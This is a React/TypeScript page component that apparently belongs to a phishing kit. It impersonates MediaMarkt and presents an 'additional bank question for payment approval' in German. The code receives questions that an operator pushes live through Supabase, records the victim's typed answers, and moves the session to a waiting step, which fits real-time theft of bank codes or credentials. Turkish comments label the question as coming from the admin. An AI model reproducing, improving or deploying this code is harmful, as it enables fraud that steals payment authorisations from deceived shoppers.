"use client";

import { useEffect, useMemo, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

type QuestionRecord = {
  question?: string;
  askedAt?: string;
  answer?: string;
  answeredAt?: string;
};

export function CustomQuestionClient({ sessionId }: { sessionId: string | null }) {
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [questions, setQuestions] = useState<QuestionRecord[]>([]);
  const [answer, setAnswer] = useState("");
  const [ready, setReady] = useState(false);
  const [saving, setSaving] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached && cached !== "undefined" && cached !== "null") {
      setEffectiveSessionId(cached);
    }
  }, [sessionId]);

  useEffect(() => {
    if (!effectiveSessionId || !supabase) return;

    const apply = (fd: Record<string, unknown> | null | undefined) => {
      const list = (fd?.customQuestions ?? []) as unknown;
      setQuestions(Array.isArray(list) ? (list as QuestionRecord[]) : []);
      setReady(true);
    };

    void (async () => {
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", effectiveSessionId)
        .maybeSingle();
      apply(data?.form_data as Record<string, unknown> | null | undefined);
    })();

    const channel = supabase
      .channel(`custom-question:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { form_data?: Record<string, unknown> | null };
          apply(next?.form_data);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, supabase]);

  // Guncel soru: cevaplanmamis son kayit
  const currentIndex = (() => {
    for (let i = questions.length - 1; i >= 0; i--) {
      if (!questions[i]?.answer || !String(questions[i].answer).trim()) return i;
    }
    return questions.length - 1;
  })();
  const currentQuestion = questions[currentIndex]?.question ?? "";

  async function submitAnswer() {
    if (!supabase || !effectiveSessionId || saving) return;
    const trimmed = answer.trim();
    if (!trimmed) return;
    setSaving(true);
    setError(null);

    const { data: row } = await supabase
      .from("sessions")
      .select("form_data")
      .eq("id", effectiveSessionId)
      .maybeSingle();

    const prevFd = (row?.form_data ?? {}) as Record<string, any>;
    const list: QuestionRecord[] = Array.isArray(prevFd.customQuestions)
      ? [...prevFd.customQuestions]
      : [];

    let target = -1;
    for (let i = list.length - 1; i >= 0; i--) {
      if (!list[i]?.answer || !String(list[i].answer).trim()) {
        target = i;
        break;
      }
    }
    if (target === -1) target = list.length - 1;

    if (target >= 0) {
      list[target] = {
        ...list[target],
        answer: trimmed,
        answeredAt: new Date().toISOString(),
      };
    } else {
      list.push({ question: "", answer: trimmed, askedAt: new Date().toISOString(), answeredAt: new Date().toISOString() });
    }

    const { error: upErr } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...prevFd,
          customQuestions: list,
        },
      })
      .eq("id", effectiveSessionId);

    setSaving(false);
    if (upErr) {
      setError("Etwas ist schiefgelaufen. Bitte versuchen Sie es erneut.");
      return;
    }
    setDone(true);
  }

  if (!ready) {
    return (
      <div className="flex min-h-screen items-center justify-center px-4">
        <div className="h-10 w-10 animate-spin rounded-full border-4 border-[#DF0000]/25 border-t-[#DF0000]" />
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-center justify-center px-4 py-10">
      <div className="w-full max-w-[400px] rounded-[24px] border border-[#DF0000]/25 px-6 py-8 shadow-[0_20px_70px_rgba(120,0,0,0.35),inset_0_1px_0_rgba(255,255,255,0.08)] backdrop-blur-xl" style={{ background: "linear-gradient(165deg, rgba(45,10,10,0.96) 0%, rgba(24,12,14,0.98) 60%, rgba(15,8,10,0.99) 100%)" }}>
        {done ? (
          <div className="py-8 text-center">
            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[#DF0000]/15 text-[#FF453A]">
              <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <p className="text-lg font-bold text-white">Vielen Dank!</p>
            <p className="mt-1 text-sm text-white/60">Ihre Antwort wurde erfolgreich gesendet.</p>
          </div>
        ) : (
          <form
            onSubmit={(e) => {
              e.preventDefault();
              void submitAnswer();
            }}
            className="space-y-6"
          >
            {/* MediaMarkt logo */}
            <div className="flex justify-center">
              <img
                src="/mediamarkt/logo.webp"
                alt="MediaMarkt"
                className="h-8 w-auto object-contain"
              />
            </div>

            {/* Shield icon */}
            <div className="flex justify-center">
              <div className="flex h-16 w-16 items-center justify-center rounded-full border border-[#DF0000]/30 bg-[#DF0000]/10 shadow-[0_0_30px_rgba(223,0,0,0.25)]">
                <svg className="h-8 w-8 text-[#FF453A]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                </svg>
              </div>
            </div>

            {/* Baslik */}
            <h1 className="text-center text-[1.3rem] font-bold leading-snug tracking-tight text-white">
              Zusätzliche Bankfrage zur Zahlungsfreigabe
            </h1>

            {/* Admin'in sorusu */}
            <div className="rounded-xl border-l-4 border-[#DF0000] bg-[#DF0000]/10 px-4 py-3">
              <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[#FF453A]">
                Frage
              </p>
              <p className="text-sm font-semibold text-white break-words">
                {currentQuestion || "..."}
              </p>
            </div>

            {/* Cevap inputu */}
            <div>
              <label className="mb-1.5 block text-[10px] font-bold uppercase tracking-widest text-white/70">
                Ihre Antwort
              </label>
              <div className="relative">
                <span className="pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-white/40">
                  <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M8.625 12a.375.375 0 11-.75 0 .375.375 0 01.75 0zm3.75 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm3.75 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zM21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 01-2.555-.337A5.972 5.972 0 015.41 20.97a5.969 5.969 0 01-.474-.065 4.48 4.48 0 00.978-2.025c.09-.457-.133-.901-.467-1.226C3.93 16.178 3 14.189 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25z" />
                  </svg>
                </span>
                <input
                  type="text"
                  required
                  value={answer}
                  onChange={(e) => setAnswer(e.target.value)}
                  placeholder="Geben Sie hier Ihre Antwort ein..."
                  className="w-full rounded-xl border border-white/15 bg-white/5 py-3.5 pl-10 pr-4 text-sm font-medium text-white placeholder-white/35 outline-none transition-all focus:border-[#DF0000] focus:bg-white/10 focus:ring-2 focus:ring-[#DF0000]/25"
                />
              </div>
            </div>

            {error && <p className="text-center text-sm font-medium text-red-500">{error}</p>}

            <button
              type="submit"
              disabled={saving || !answer.trim()}
              className="flex w-full items-center justify-center gap-2 rounded-xl bg-[linear-gradient(180deg,#E50914_0%,#B8000C_100%)] px-4 py-3.5 text-[15px] font-bold uppercase tracking-wide text-white shadow-[0_10px_30px_rgba(223,0,0,0.4),inset_0_1px_0_rgba(255,255,255,0.25)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-50"
            >
              {saving ? "Wird gesendet..." : "Weiter"}
              <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3" />
              </svg>
            </button>
          </form>
        )}
      </div>
    </div>
  );
}
